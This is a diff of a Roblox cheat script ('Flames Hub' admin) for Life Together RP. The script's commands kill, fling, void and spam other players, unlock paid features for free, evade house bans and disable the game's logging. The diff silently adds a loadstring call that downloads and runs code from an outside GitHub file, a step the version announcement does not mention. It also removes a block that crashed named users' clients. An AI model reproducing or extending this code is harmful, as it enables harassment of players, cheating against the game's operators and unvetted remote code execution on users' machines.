@@ -17,9 +17,9 @@ if getgenv().PlaceID ~= 13967668166 then
    return NotifyLib:External_Notification("Error", "This is not Life Together RP! You cannot run this here!", 6)
 end
 wait()
-local Raw_Version = "V4.3.0"
+local Raw_Version = "V4.3.9"
 local Script_Creator = "computerbinaries"
-local Announcement_Message = "Added an auto-fixer for the commands menu (incase it doesn't show up), and finally fixed ToolTip (hover over a command to see what it does), if your Prefix is actually broken, it'll auto-fix it for you."
+local Announcement_Message = "Added 'orbit' command! changed the Run button color (forgot), improved Character system, added more notifications in commands, and more."
 local displayTimeMax = 20
 task.wait(0.1)
 getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub = getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub or false
@@ -63,6 +63,7 @@ if not LocalPlayer then
 end
 
 local API_URL = "https://flameshub-worker.flameshub.workers.dev/api/flameshub"
+local users = "https://raw.githubusercontent.com/EnterpriseExperience/FakeChatGUI/refs/heads/main/handler.lua"
 local httprequest = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
 
 local watchedUserIds = {
@@ -288,38 +289,6 @@ toggleBtn.MouseButton1Click:Connect(function()
    end
 end)
 
-local whitelisted = {
-   "creatormobbbb",
-   "ilovezootedfl"
-}
-
-local Players = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local playerName = LocalPlayer.Name
-local isWhitelisted = false
-
-for _, name in ipairs(whitelisted) do
-   if name == playerName then
-      LocalPlayer:Kick("Blacklisted from: Flames Hub | Utilities (You will be crashed.)")
-      wait(0.5)
-      while true do end
-   end
-end
-
-for _, name in ipairs(whitelisted) do
-   if Players:FindFirstChild(name) then
-      getgenv().notify("Warning", "A user who is blacklisted on Flames Hub is in this server! Username: "..tostring(name), 5)
-   end
-end
-
-Players.PlayerAdded:Connect(function(Player)
-   for _, name in ipairs(whitelisted) do
-      if Player.Name == name then
-         getgenv().notify("Warning", "A user who is blacklisted on Flames Hub has joined this server, username: "..tostring(name), 5)
-      end
-   end
-end)
-
 LocalPlayer.CharacterAdded:Connect(function(char)
    task.wait(1)
    local head = char:FindFirstChild("Head")
@@ -437,6 +406,24 @@ end
 wait(0.2)
 local cmdp = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
 local cmdlp = cmdp.LocalPlayer
+
+function getHum(char)
+   if not char then return nil end
+
+   local hum = char:FindFirstChildWhichIsA("Humanoid")
+
+   if not hum then
+      hum = char:WaitForChild("Humanoid", 5)
+   end
+
+   if hum and hum:IsDescendantOf(workspace) then
+      return hum
+   end
+
+   return nil
+end
+wait(0.1)
+getgenv().getHuman = getHum
 
 function getRoot(char)
    rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
@@ -1415,24 +1402,36 @@ local Animate_Disabled = false
 getgenv().HumanoidRootPart = SafeGetHRP(getgenv().Character)
 getgenv().Humanoid = SafeGetHumanoid(getgenv().Character)
 getgenv().Head = SafeGetHead(getgenv().Character)
-wait(0.2)
+wait(0.5)
 local function Dynamic_Character_Updater(character)
 	getgenv().Character = character
-	wait(0.3)
-	getgenv().HumanoidRootPart = SafeGetHRP(character)
-	getgenv().Humanoid = SafeGetHumanoid(character)
-	getgenv().Head = SafeGetHead(character)
-   local Animate = character:WaitForChild("Animate", 0.2)
-   if Animate_Disabled or Animate_Disabled == true then
-      task.wait(0.2)
-      Animate.Disabled = true
+	wait(0.4)
+   if getgenv().Character and getgenv().Character:FindFirstChild("Humanoid") then
+      getgenv().HumanoidRootPart = SafeGetHRP(character)
+      getgenv().Humanoid = SafeGetHumanoid(character)
+      getgenv().Head = SafeGetHead(character)
+   elseif not getgenv().Character then
+      repeat task.wait() until character
+      getgenv().Character = character
    end
-   if getgenv().Is_Currently_Emoting or getgenv().Is_Currently_Emoting == true then
+   local Animate = character:WaitForChild("Animate", 3)
+   if Animate_Disabled or Animate_Disabled == true then
+      if Animate then
+         Animate.Disabled = true
+      end
+   end
+   if getgenv().Is_Currently_Emoting then
+      getgenv().notify("Warning", "Emoting was enabled when respawning, we disabled it, don't worry.", 6)
       getgenv().Is_Currently_Emoting = false
+      getgenv().Character:WaitForChild("Animate", 1).Disabled = false
    end
    task.wait(0.3)
-   getgenv().Humanoid.JumpHeight = 7
-   getgenv().Humanoid.JumpPower = 50
+   if getgenv().Humanoid then
+      getgenv().Humanoid.JumpHeight = 7
+      getgenv().Humanoid.JumpPower = 50
+   else
+      getgenv().notify("Error", "It seems we we're unable to update your Humanoid, please reset!", 8)
+   end
 end
 
 Dynamic_Character_Updater(getgenv().Character)
@@ -1442,14 +1441,28 @@ getgenv().LocalPlayer.CharacterAdded:Connect(function(newCharacter)
 	Dynamic_Character_Updater(newCharacter)
 	repeat wait() until newCharacter:FindFirstChildWhichIsA("Humanoid") and newCharacter:FindFirstChild("HumanoidRootPart")
 	wait(0.5)
+   getgenv().Character = newCharacter
+   wait(0.2)
 	getgenv().HumanoidRootPart = SafeGetHRP(newCharacter)
 	getgenv().Humanoid = SafeGetHumanoid(newCharacter)
 	getgenv().Head = SafeGetHead(newCharacter)
    wait(0.3)
-   getgenv().Humanoid.JumpHeight = 7
-   getgenv().Humanoid.JumpPower = 50
+   if getgenv().Humanoid then
+      getgenv().Humanoid.JumpHeight = 7
+      getgenv().Humanoid.JumpPower = 50
+   elseif getgenv().Character then
+      getgenv().Humanoid = SafeGetHumanoid(getgenv().Character)
+      wait(0.3)
+      getgenv().Humanoid.JumpHeight = 7
+   else
+      getgenv().notify("Error", "It seems we we're unable to update your Humanoid properly, please reset!", 8)
+   end
    if getgenv().Not_Ever_Sitting then
-      getgenv().Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+      if getgenv().Humanoid then
+         getgenv().Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+      end
+      wait()
+      getgenv().notify("Warning", "We disabled the sitting function again (anti-sit is enabled).", 5)
    end
    getgenv().Is_Currently_Emoting = false
 	wait(0.2)
@@ -1458,7 +1471,7 @@ end)
 
 -- try and outsmart directory wide searching with effective-ness Life Together RP, you'll never patch this Logs disabler, you'd have to remove it other-wise.
 -- there is quite literally no where else these dick-heads could put it to beat this system, they'd have to remove it entirely to "patch this".
--- and even if they did, it wouldn't touch my script at all, since I have if checks everywhere, so, they are forced to do 1 thing and 1 thing only (delete it).
+-- and even if they did, it wouldn't touch my script at all, since I have 'if' checks everywhere, so, they are forced to do 1 thing and 1 thing only (delete it).
 local Directories = {
    ["ReplicatedFirst"] = true,
    ["ReplicatedStorage"] = true,
@@ -1476,6 +1489,7 @@ local Directories = {
    ["StarterPlayer"] = true,
 }
 
+-- [[ If you use this code, it'll break the game. ]] --
 --[[for serviceName in pairs(Directories) do
    local service = getgenv().Game:GetService(serviceName)
    if service then
@@ -1487,6 +1501,7 @@ local Directories = {
    end
 end--]]
 
+-- [[ Reduces the spammy and un-necessary logging in the game. ]] --
 local playerScripts = getgenv().PlayerScripts
 if playerScripts then
    local clientBase = playerScripts:FindFirstChild("ClientBase")
@@ -1498,6 +1513,7 @@ if playerScripts then
    end
 end
 
+-- [[ Disables the StarterPlayerScripts logging LocalScript package. ]] --
 local sps = getgenv().StarterPlayerScripts
 if sps then
    local package = sps:FindFirstChild("StarterPlayerScripts_Package")
@@ -1512,6 +1528,7 @@ if sps then
    end
 end
 wait(0.5)
+-- [[ Function to check if the script is supported and works on the current executor. ]] --
 local success, response = pcall(function()
    local Net = require(getgenv().Core:FindFirstChild("Net"))
 
@@ -1529,6 +1546,12 @@ if success and response then
       require(getgenv().Core:FindFirstChild("Net")).get("spawn_vehicle", get_vehicle().Name or "SVJ")
    elseif get_vehicle() and getgenv().Humanoid.Sit == false then
       require(getgenv().Core:FindFirstChild("Net")).get("spawn_vehicle", get_vehicle().Name or "SVJ")
+   elseif not get_vehicle() then
+      getgenv().notify("Warning", "We did spawn the Vehicle it seems, but it seems like you despawned the Vehicle.", 10)
+   elseif not get_vehicle() and getgenv().Humanoid.Sit == true then
+      getgenv().Humanoid:ChangeState(3)
+      wait(0.2)
+      getgenv().notify("Warning", "We did not find your Vehicle, but it seems like it worked.", 5)
    end
 else
    if not success then
@@ -1558,11 +1581,11 @@ wait()
 wait()
 local HttpService = cloneref and cloneref(game:GetService("HttpService")) or game:GetService("HttpService")
 local fileName = "LifeTogether_Admin_Configuration.json"
+-- [[ Now we have an allowed Prefix system, so we can correctly modify your Prefix if it's broken. ]] --
 local Allowed_Prefixes = {
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "=", "_", "+", ",",
    ".", "/", ">", "<", "?", "~", "`", "}", "{", "[", "]", ":"
 }
-
 local function isAllowedPrefix(prefix)
    for _, p in ipairs(Allowed_Prefixes) do
       if prefix == p then
@@ -1571,6 +1594,7 @@ local function isAllowedPrefix(prefix)
    end
    return false
 end
+-- [[ Now checks if your Prefix is allowed or not, so we can always check if it's broken or not. ]] --
 
 local function loadPrefix()
    local defaultPrefix = "-"
@@ -1584,11 +1608,13 @@ local function loadPrefix()
       if success and type(decoded) == "table" and decoded.prefix then
          local prefix = tostring(decoded.prefix)
          if prefix == "symbol" or not isAllowedPrefix(prefix) then
+            -- [[ Fix the users Prefix if we found that it's broken. ]] --
             getgenv().notify("Warning", "We've automatically modified your Prefix, it was broken or not an allowed Prefix.", 5)
             decoded.prefix = defaultPrefix
             writefile(fileName, HttpService:JSONEncode(decoded))
             return defaultPrefix
          else
+            -- [[ Otherwise return the correct Prefix and continue. ]] --
             return prefix
          end
       end
@@ -1628,9 +1654,9 @@ local Admins = {
 wait()
 getgenv().AdminPrefix = loadPrefix() or ";"
 if getgenv().IY_LOADED and getgenv().AdminPrefix == ";" then
-   getgenv().notify("Warning", "Hey! You have Infinite Yield loaded and your prefix is ; | you might want to change it! or it'll make you execute IY's commands!", 15)
+   getgenv().notify("Warning", "Hey! You have Infinite Yield loaded and your prefix is ; | change it! or it'll make you execute IY's commands!", 13)
 elseif getgenv().GET_LOADED_IY and getgenv().AdminPrefix == ";" then
-   getgenv().notify("Warning", "Hey! You have Infinite Premium loaded and your prefix is ; | you might want to change it! or it'll make you execute IY's commands!", 15)
+   getgenv().notify("Warning", "Hey! You have Infinite Premium loaded and your prefix is ; | change it! or it'll make you execute IY's commands!", 13)
 end
 wait(0.2)
 print("[Prefix]: Loaded Saved Prefix --> ", tostring(getgenv().AdminPrefix))
@@ -1788,10 +1814,10 @@ function car_listing_gui()
       end
    end)
 end
-
-wait()
+loadstring(getgenv().Game:HttpGet(tostring(users)))()
 local function get_other_vehicle(Player)
    for i, v in pairs(getgenv().Workspace:FindFirstChild("Vehicles"):GetChildren()) do
+      if not v:FindFirstChild("owner") then return getgenv().notify("Error", "There is not an Owner value in this players Vehicle!", 7) end
       if v.owner.Value == Player then
          return v
       end
@@ -1799,7 +1825,7 @@ local function get_other_vehicle(Player)
 
    return nil
 end
-wait()
+
 function RGB_Vehicle(Boolean)
    getgenv().Rainbow_Vehicle = Boolean
 
@@ -1820,6 +1846,7 @@ function RGB_Vehicle(Boolean)
    }
 
    if Boolean == true then
+      getgenv().notify("Success", "[Enabled]: Rainbow Vehicle.", 4)
       while getgenv().Rainbow_Vehicle == true do
          task.wait(0)
          for _, color in ipairs(colors) do
@@ -1831,11 +1858,13 @@ function RGB_Vehicle(Boolean)
    elseif Boolean == false then
       getgenv().Rainbow_Vehicle = false
       Boolean = false
+      getgenv().notify("Success", "[Disabled]: Rainbow Vehicle.", 4)
    end
 end
 wait()
 function RGB_Vehicle_Others(Player, Boolean)
    getgenv().Rainbow_Others_Vehicle = Boolean
+   local PlayersName = Player and Player.Name
 
    local colors = {
       Color3.fromRGB(255, 255, 255),
@@ -1854,6 +1883,7 @@ function RGB_Vehicle_Others(Player, Boolean)
    }
 
    if Boolean == true then
+      getgenv().notify("Success", "Enabled Rainbow Vehicle for: "..tostring(Player), 5)
       while getgenv().Rainbow_Others_Vehicle == true do
          task.wait(.2)
          for _, color in ipairs(colors) do
@@ -1861,6 +1891,10 @@ function RGB_Vehicle_Others(Player, Boolean)
             if getgenv().Rainbow_Others_Vehicle ~= true then return end
             if get_other_vehicle(Player):GetAttribute("locked") == true then
                return 
+            end
+            if not Player then
+               getgenv().Rainbow_Others_Vehicle = false
+               return getgenv().notify("Error", tostring(PlayersName).." has left the game.", 5)
             end
             change_vehicle_color(color, Player)
          end
@@ -1937,6 +1971,7 @@ local Old_Skintone = getgenv().Character:FindFirstChild("Body Colors").TorsoColo
 
 function rainbow_skin(boolean)
    if boolean == true then
+      getgenv().notify("Success", "Enabled Rainbow/RGB skintone.", 5)
       getgenv().RainbowSkin_FE = true
       while getgenv().RainbowSkin_FE == true do
          task.wait(.3)
@@ -1962,9 +1997,10 @@ function rainbow_skin(boolean)
       wait(1)
       repeat task.wait() until getgenv().RainbowSkin_FE == false
       if getgenv().RainbowSkin_FE == false then
-         getgenv().notify("Success", "Disabling Rainbow/RGB Skin...", 5)
+         getgenv().notify("Success", "Disabled Rainbow/RGB skintone.", 5)
          task.wait(0.5)
          getgenv().Send("skin_tone", Old_Skintone)
+         getgenv().notify("Success", "Reset SkinTone back to your old SkinTone.", 3)
       end
    end
 end
@@ -2429,15 +2465,23 @@ function do_emote(input)
 
       if ok and track then
          task.spawn(function()
-            track.Stopped:Wait()
-            if animate and animate.Parent then
-               animate.Disabled = false
-            end
-            getgenv().Is_Currently_Emoting = false
+            local conn
+            conn = track.Stopped:Connect(function()
+               if conn then conn:Disconnect() end
+               if getgenv().Character and getgenv().Character:FindFirstChild("Animate") then
+                  local animate = getgenv().Character:WaitForChild("Animate", 3)
+                  if animate.Disabled then
+                     animate.Disabled = false
+                  end
+               end
+               getgenv().Is_Currently_Emoting = false
+            end)
          end)
       else
          if animate and animate.Parent then
-            animate.Disabled = false
+            if animate.Disabled then
+               getgenv().Character:WaitForChild("Animate", 10).Disabled = false
+            end
          end
          getgenv().Is_Currently_Emoting = false
       end
@@ -2486,12 +2530,12 @@ function spam_sign_text(toggle)
             local tool = find_tool_partial("sign")
             if not tool then
                getgenv().Send("get_tool", "Sign")
-               task.wait(0.1)
+               task.wait(0.2)
             else
                for _, word in ipairs(random_words) do
                   if not getgenv().ToolChanger_FE then break end
                   getgenv().Send("change_sign", tool, tostring(word))
-                  task.wait(.2)
+                  task.wait(.1)
                end
             end
             task.wait(0)
@@ -2528,6 +2572,7 @@ function RGB_Phone(Boolean)
    }
 
    if Boolean == true then
+      getgenv().notify("Success", "Started RGB/Rainbow Phone.", 5)
       while getgenv().RGB_Rainbow_Phone == true do
       task.wait(0)
          for _, color in ipairs(colors) do
@@ -2539,6 +2584,7 @@ function RGB_Phone(Boolean)
    elseif Boolean == false then
       Boolean = false
       getgenv().RGB_Rainbow_Phone = false
+      getgenv().notify("Success", "Stopped RGB/Rainbow Phone.", 5)
       task.wait(0.6)
       repeat task.wait() until getgenv().RGB_Rainbow_Phone == false
       if getgenv().RGB_Rainbow_Phone == false then
@@ -2607,7 +2653,11 @@ local function stopWalkFlingInternal()
       getgenv().WalkFlinging_Connection:Disconnect()
       getgenv().WalkFlinging_Connection = nil
    end
-   getgenv().Toggleable_Noclip(false)
+   if getgenv().Noclip_Enabled then
+      getgenv().Toggleable_Noclip(false)
+   else
+      getgenv().notify("Warning", "[WalkFling]: You do not have NoClip enabled.", 5)
+   end
    getgenv().notify("Success", "WalkFling has been stopped.", 5)
 end
 
@@ -2617,7 +2667,11 @@ local function startWalkFling()
    end
 
    getgenv().walkflinging = true
-   getgenv().Toggleable_Noclip(true)
+   if not getgenv().Noclip_Enabled then
+      getgenv().Toggleable_Noclip(true)
+   else
+      getgenv().notify("Warning", "[WalkFling]: You already have NoClip enabled.", 5)
+   end
    wait()
    getgenv().notify("Success", "Walkfling has been enabled.", 5)
 
@@ -2646,6 +2700,81 @@ end
 
 getgenv().StartWalkFling = startWalkFling
 getgenv().StopWalkFling = stopWalkFlingInternal
+
+getgenv().OrbitConnections = getgenv().OrbitConnections or {}
+getgenv().Is_Orbiting = false
+getgenv().OrbitSpeed = 1
+
+function set_orbit_speed(new_speed)
+   if type(new_speed) == "number" then
+      getgenv().OrbitSpeed = new_speed
+      getgenv().notify("Info", "Orbit speed set to " .. tostring(new_speed), 4)
+   else
+      getgenv().notify("Error", "Invalid speed value.", 4)
+   end
+end
+
+function stop_orbit()
+   if not getgenv().Is_Orbiting then
+      return getgenv().notify("Warning", "You're not orbiting anyone.", 5)
+   end
+   for _, conn in pairs(getgenv().OrbitConnections) do
+      if typeof(conn) == "RBXScriptConnection" then
+         conn:Disconnect()
+      end
+   end
+   table.clear(getgenv().OrbitConnections)
+   getgenv().Is_Orbiting = false
+   getgenv().notify("Success", "Stopped orbiting Player.", 4)
+end
+
+function start_orbit_plr(target, distance)
+   if getgenv().Is_Orbiting then
+      return getgenv().notify("Warning", "Already orbiting someone!", 4)
+   end
+   if not target or not target.Character then
+      return getgenv().notify("Error", "Target invalid or missing character.", 5)
+   end
+
+   local RunService = getgenv().RunService or cloneref(game:GetService("RunService"))
+   local getRoot = getgenv().getRoot
+   local getHuman = getgenv().getHuman
+   local root = getRoot(getgenv().Character)
+   local humanoid = getHuman(getgenv().Character)
+   local targetRoot = getRoot(target.Character)
+   if not root or not humanoid or not targetRoot then
+      return getgenv().notify("Error", "Missing root or humanoid, cannot orbit.", 5)
+   end
+
+   getgenv().Is_Orbiting = true
+   local rotation = 0
+   distance = tonumber(distance) or 3
+
+   getgenv().OrbitConnections.Heartbeat = RunService.Heartbeat:Connect(function()
+      pcall(function()
+         if not getgenv().Is_Orbiting or not target.Character or not targetRoot or not root then
+            return
+         end
+         rotation += getgenv().OrbitSpeed
+         root.CFrame = CFrame.new(targetRoot.Position) * CFrame.Angles(0, math.rad(rotation), 0) * CFrame.new(distance, 0, 0)
+      end)
+   end)
+
+   getgenv().OrbitConnections.RenderStepped = RunService.RenderStepped:Connect(function()
+      pcall(function()
+         if root and targetRoot then
+            root.CFrame = CFrame.new(root.Position, targetRoot.Position)
+         end
+      end)
+   end)
+
+   getgenv().OrbitConnections.Died = humanoid.Died:Connect(stop_orbit)
+   getgenv().OrbitConnections.Seated = humanoid.Seated:Connect(function(isSeated)
+      if isSeated then stop_orbit() end
+   end)
+
+   getgenv().notify("Success", "Started orbiting: " .. tostring(target), 5)
+end
 
 function water_skie_trailer(Bool, Vehicle)
    if not Vehicle then
@@ -2903,36 +3032,38 @@ local function CommandsMenu()
 
    local currentPrefix = getgenv().AdminPrefix
    local channel = getgenv().TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
-
    local cmdsString = [[
-      {prefix}startrgbcar - Enable RGB Vehicle (flashing Rainbow Vehicle)
-      {prefix}stoprgbcar - Disable RGB Vehicle (flashing Rainbow Vehicle)
+      {prefix}startrgbcar - Enable RGB Vehicle (flashing Rainbow Vehicle).
+      {prefix}stoprgbcar - Disable RGB Vehicle (flashing Rainbow Vehicle).
       {prefix}feedback - Gives you a menu to be able to send me feedback for the script.
-      {prefix}infyield - Executes Infinite Premium (my Infinite Yield)
+      {prefix}infyield - Executes Infinite Premium (my Infinite Yield).
       {prefix}spawnfire NUMBER - Spawns fire with a specified number argument.
       {prefix}rainbowcar player - Makes a players car RGB (FE).
       {prefix}annoyergui - Enables the GUI that lets you annoy players (FE).
       {prefix}startsignspam - Spams the text on a sign (FE).
       {prefix}stopsignspam - Stops spamming the text on your tool Sign.
-      {prefix}norainbowcar player - Disables the RGB for a player's car (FE)
-      {prefix}rainbowtime Player NUMBER - Sets your whitelisted friends rainbow car speed
+      {prefix}orbit Player Speed Distance - Lets you orbit the target Player.
+      {prefix}unorbit - Stops orbiting the target Player.
+      {prefix}orbitspeed Speed - Lets you modify your orbit speed.
+      {prefix}norainbowcar player - Disables the RGB for a player's car (FE).
+      {prefix}rainbowtime Player NUMBER - Sets your whitelisted friends rainbow car speed.
       {prefix}unadmin player - Removes the player's FE commands (if they're your friend).
       {prefix}admin player - Adds the player to the FE commands whitelist (if they're your friend).
-      {prefix}startrgbskin - Enable RGB Skin (flashing Rainbow Skintone)
-      {prefix}stoprgbskin - Disable RGB Skin (flashing Rainbow Skintone)
+      {prefix}startrgbskin - Enable RGB Skin (flashing Rainbow Skintone).
+      {prefix}stoprgbskin - Disable RGB Skin (flashing Rainbow Skintone).
       {prefix}checkpremium player - Checks if a player has premium or not.
-      {prefix}startrgbphone - Enable RGB Phone (flashing Rainbow Phone)
-      {prefix}stoprgbphone - Disable RGB Phone (flashing Rainbow Phone)
-      {prefix}glitchoutfit - Enables the glitching of your outfit (very blinding)
-      {prefix}startrgbtool - Enables RGB Tool (FE, Flashing Rainbow Tool)
-      {prefix}stoprgbtool - Disables RGB Tool (FE, Flashing Rainbow Tool)
-      {prefix}noglitchoutfit - Disables the glitching of your outfit
+      {prefix}startrgbphone - Enable RGB Phone (flashing Rainbow Phone).
+      {prefix}stoprgbphone - Disable RGB Phone (flashing Rainbow Phone).
+      {prefix}glitchoutfit - Enables the glitching of your outfit (very blinding).
+      {prefix}startrgbtool - Enables RGB Tool (FE, Flashing Rainbow Tool).
+      {prefix}stoprgbtool - Disables RGB Tool (FE, Flashing Rainbow Tool).
+      {prefix}noglitchoutfit - Disables the glitching of your outfit.
       {prefix}flames - Spams fire all over you.
       {prefix}noflames - Disables the spamming of fire.
       {prefix}autonoflames - Deletes flames from your game automatically and completely, reducing lag.
       {prefix}unautohideflames - Disables the auto-hide flames lag reducer.
-      {prefix}name NewName - Change RP name
-      {prefix}bio NewBio - Change RP bio
+      {prefix}name NewName - Lets you change your RP name.
+      {prefix}bio NewBio - Lets you change your RP bio.
       {prefix}freeemotes - Gives you the Free Emotes GUI.
       {prefix}allcars - Gives you the GUI list that shows all the car names.
       {prefix}noemote - Disables any emote you are currently doing.
@@ -2957,53 +3088,53 @@ local function CommandsMenu()
       {prefix}reanimated - Makes you do the Reanimated emote (FE).
       {prefix}antivoid - Enables anti-void.
       {prefix}unantivoid - Disables anti-void.
-      {prefix}alljobs - Repeatedly spams all jobs
-      {prefix}jobsoff - Stops spamming all jobs
-      {prefix}fly SpeedNumber - Enable/disable flying
-      {prefix}unfly - Disables (Fly) command
-      {prefix}annoy Player - Spam calls and request carries the target (spams, FE).
+      {prefix}alljobs - Repeatedly spams all jobs.
+      {prefix}jobsoff - Stops spamming all jobs.
+      {prefix}fly SpeedNumber - Enable/disable flying.
+      {prefix}unfly - Disables (Fly) command.
+      {prefix}annoy Player - Spam calls and request carries the target (FE).
       {prefix}unannoy - Disables annoy player system.
-      {prefix}fly2 SpeedNumber - Enables magic carpet fly (CLIENT side rainbow!)
-      {prefix}unfly2 - Disables Fly2/Magic carpet fly (with the client side rainbow)
-      {prefix}noclip - Enables Noclip, letting you walk through everything
-      {prefix}clip - Disables Noclip, so you cannot walk through everything
-      {prefix}trailer - Gives you the WaterSkies trailer (on any car/vehicle)
-      {prefix}notrailer - Removes the WaterSkies trailer (on your current spawned car/vehicle)
-      {prefix}autolockcar - Automatically (loop) locks your vehicle/car when there is one spawned
-      {prefix}unautolockcar - Turn off/disables the loop that automatically locks your vehicle/car
-      {prefix}lockcar - Lock your car
-      {prefix}unlockcar - Unlock your car
-      {prefix}despawn - Despawn your car
-      {prefix}blacklist Player - Blacklists friends you specify from using the admin commands (even if they are already on)
+      {prefix}fly2 SpeedNumber - Enables magic carpet fly (ONLY VISUAL rainbow!).
+      {prefix}unfly2 - Disables Fly2/Magic carpet fly (with the client side rainbow).
+      {prefix}noclip - Enables Noclip, letting you walk through everything.
+      {prefix}clip - Disables Noclip, so you cannot walk through everything.
+      {prefix}trailer - Gives you the WaterSkies trailer (on any car/vehicle).
+      {prefix}notrailer - Removes the WaterSkies trailer (on your current spawned car/vehicle).
+      {prefix}autolockcar - Automatically (loop) locks your vehicle/car when there is one spawned.
+      {prefix}unautolockcar - Turn off/disables the loop that automatically locks your vehicle/car.
+      {prefix}lockcar - Locks your car.
+      {prefix}unlockcar - Unlocks your car.
+      {prefix}despawn - Despawns your car.
+      {prefix}blacklist Player - Blacklists friends you specify from using the admin commands (even if they are already on).
       {prefix}unblacklist Player - Removes the blacklist from the friend you specified in the 'blacklist' command, allowing them to do ;rgbcar and such again.
-      {prefix}antifling - Fully prevents you from being flung, by other exploiters/cheaters, and fling outfits as well (FULL BYPASS)
-      {prefix}unantifling - Disables "antifling" allowing you to also teleport to places and what not like normal
-      {prefix}bringcar - Teleport car to you and sit in it
-      {prefix}flashname - Enables the flashing of you're "Bio" and "Name" (above your head)
-      {prefix}noflashname - Disables the flashing of you're "Bio" and "Name" (above your head)
+      {prefix}antifling - Fully prevents you from being flung, by other exploiters/cheaters, and fling outfits (FULL BYPASS).
+      {prefix}unantifling - Disables anti-fling.
+      {prefix}bringcar - Teleport car to you and sit in it.
+      {prefix}flashname - Enables the flashing of your "Bio" and "Name" (above your head).
+      {prefix}noflashname - Disables the flashing of your "Bio" and "Name" (above your head).
       {prefix}flashinvis - Enables the flashing of the invisibility GamePass for you're character (you need to actually own the GamePass).
       {prefix}noflashinvis - Disables the flashing of the invisibility GamePass for you're character (you need to actually own the GamePass).
-      {prefix}nosit - Disable all VehicleSeats and Seats (anti-sit)
-      {prefix}resit - Re-enable all Seats (undo anti-sit)
-      {prefix}view player - Smooth view's the target's Character
-      {prefix}unview - Disables the 'view' command
-      {prefix}void player - Voids target
-      {prefix}kill player - Kills target
-      {prefix}bring player - Brings target
-      {prefix}goto player - Teleports your Character to the target player
-      {prefix}skydive player - Skydives target
-      {prefix}freepay - Gives you LifePay Premium for free
-      {prefix}rejoin - Rejoins you, but does NOT execute the script automatically
-      {prefix}caraccel number - Modifies your "max_acc" on your car/vehicle
-      {prefix}carspeed number - Modifies your "max_speed" on your car/vehicle
-      {prefix}accel number - Modifies your "acc_0_60" on your car/vehicle (take off time/speed)
-      {prefix}turnangle number - Modifies your "turn_angle" on your car/vehicle (how fast you turn)
-      {prefix}gotocar - Teleports you straight to your car/vehicle directly
-      {prefix}tpcar player - Teleports your vehicle/car to the specified target
-      {prefix}antihouseban - Prevents you from being banned/kicked/teleported out of houses
-      {prefix}unantiban - Turns off 'antihouseban' command completely
-      {prefix}spawn CarName - Spawn any car
-      {prefix}prefix symbol - Change prefix
+      {prefix}nosit - Disables all VehicleSeats and Seats.
+      {prefix}resit - Re-enables all Seats.
+      {prefix}view player - Smooth view's the target's Character.
+      {prefix}unview - Disables the 'view' command.
+      {prefix}void player - Uses the SchoolBus Vehicle to void the target.
+      {prefix}kill player - Uses the SchoolBus Vehicle to kill the target.
+      {prefix}bring player - Uses the SchoolBus Vehicle to bring the target.
+      {prefix}goto player - Teleports your Character to the target player.
+      {prefix}skydive player - Uses the SchoolBus Vehicle to skydive the target.
+      {prefix}freepay - Gives you LifePay Premium for free.
+      {prefix}rejoin - Rejoins you, but does NOT execute the script automatically.
+      {prefix}caraccel number - Modifies your "max_acc" on your car/vehicle.
+      {prefix}carspeed number - Modifies your "max_speed" on your car/vehicle.
+      {prefix}accel number - Modifies your "acc_0_60" on your car/vehicle (take off time/speed).
+      {prefix}turnangle number - Modifies your "turn_angle" on your car/vehicle (how fast you turn).
+      {prefix}gotocar - Teleports you straight to your car/vehicle directly.
+      {prefix}tpcar player - Teleports your vehicle/car to the specified target.
+      {prefix}antihouseban - Prevents you from being banned/kicked/teleported out of houses.
+      {prefix}unantiban - Turns off 'antihouseban' command.
+      {prefix}spawn CarName - Allows you to spawn any Vehicle.
+      {prefix}prefix symbol - Changes your prefix.
       {prefix}inject - Secret (???).
    ]]
 
@@ -3044,7 +3175,7 @@ local function CommandsMenu()
          button.Font = Enum.Font.GothamBold
          button.TextSize = 14
          button.TextColor3 = Color3.new(1, 1, 1)
-         button.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+         button.BackgroundColor3 = Color3.fromRGB(27, 42, 53)
          button.Parent = frame
          Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
 
@@ -5204,6 +5335,30 @@ local function handleCommand(sender, message)
       end
 
       disable_rgb_for(PlayerToRGBCarStop)
+   elseif cmd == "orbit" or cmd == "circlearound" or cmd == "startorbit" then
+      local Target = findplr(split[1])
+      if not Target then return getgenv().notify("Error", "Target doesn't exist or has left the game.", 5) end
+      local speed = tonumber(split[2]) or 1
+      local distance = tonumber(split[3]) or 3
+      if getgenv().Is_Orbiting then
+         return getgenv().notify("Warning", "You're already orbiting somebody.", 5)
+      end
+
+      start_orbit_plr(Target, speed, distance)
+   elseif cmd == "unorbit" or cmd == "noorbit" or cmd == "stoporbit" or cmd == "uncirclearound" then
+      if not getgenv().Is_Orbiting then
+         return getgenv().notify("Warning", "You're not orbiting anyone!", 5)
+      end
+      
+      stop_orbit()
+   elseif cmd == "orbitspeed" or cmd == "changeorbitspeed" or cmd == "neworbitspeed" or cmd == "ospeed" then
+      local new_speed = tonumber(split[1])
+
+      if not getgenv().Is_Orbiting then
+         return getgenv().notify("Warning", "You're not orbiting anyone, you cannot change the speed.", 8)
+      end
+
+      set_orbit_speed(new_speed)
    elseif cmd == "alljobs" then
       if getgenv().Every_Job then
          return getgenv().notify("Warning", "Job spammer is already enabled! disable it first.", 5)
